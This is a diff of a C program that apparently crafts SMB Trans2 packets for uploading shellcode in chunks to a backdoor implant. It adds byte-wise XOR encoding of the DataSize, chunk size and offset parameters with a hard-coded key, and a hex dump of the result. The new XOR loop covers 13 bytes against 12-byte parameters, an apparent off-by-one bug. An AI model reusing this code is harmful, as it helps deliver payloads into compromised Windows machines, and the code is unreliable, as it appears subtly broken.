@@ -195,34 +195,41 @@ int main() {
 	trans2->padding = 0x00;
 	
 	printf("Offset of Parameters:  %d\n", sizeof(smb_header) + sizeof(Trans_Response));
-        printf("Offset of Data:  %d\n", sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters));
+    printf("Offset of Data:  %d\n", sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters));
 	int param_offset_len = sizeof(smb_header) + sizeof(Trans_Response);
 	int dataOffset_len = sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters);
 	trans2->parameterOffset = param_offset_len;
 	trans2->dataOffset = dataOffset_len;
 	
 	unsigned int XorKey = 0x58581162;
+	//Sample XorKey used for testing -> unsigned int XorKey = 0x58581162;
+	unsigned char byte_xor_key[4];
+	byte_xor_key[0] = (unsigned char)XorKey;
+	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
+	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
+	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
 	
     smb_parameters *smb_params = (smb_parameters*)(buffer + sizeof(netbios) + sizeof(smb_header) + sizeof(Trans_Response));
 
     //make DataSize dynamic where it calculates the size of the buffer of the payload / shellcode
     //In this case, this is static but will change to be dynamic in the future.
-    unsigned long DataSize = 0x507308 ^ XorKey;
+    unsigned long DataSize = 0x507308;
 	
     //size of the chunk of the payload being sent.  all but last packet are 4096
-    unsigned long chunksize = 4096 ^ XorKey;
+    unsigned long chunksize = 4096;
 
     //offset begins at 0 and increments based on the previous packets sent
-    unsigned long offset = 0 ^ XorKey;
+    unsigned long offset = 0;
     
     memcpy(smb_params->parameters, (unsigned char*)&DataSize, 4);
     memcpy(smb_params->parameters + 4, (unsigned char*)&chunksize, 4);
     memcpy(smb_params->parameters + 8 , (unsigned char*)&offset, 4);
-    
-    /*
-    smb_params->DataSize ^= XorKey; 
-    smb_params->chunksize ^= XorKey; 
-    smb_params->offset ^= XorKey; */
+
+	//XOR the parameters with the XOR key
+	for (i = 0; i < 13; i++)
+	{
+		smb_params->parameters[i] ^= byte_xor_key[i % 4];
+	}
     
     //fill the rest of the buffer
     int rest = sizeof(buffer) - sizeof(netbios) - sizeof(smb_header) - sizeof(Trans_Response) - sizeof(smb_parameters);
@@ -237,6 +244,5 @@ int main() {
    //test output: 6a 62 08 58 62 01 58 58 62 11 58 58              jb.Xb.XXb.XX
     hexDump(NULL, smb_params->parameters, 12);
   
-    
     return 0;
 }
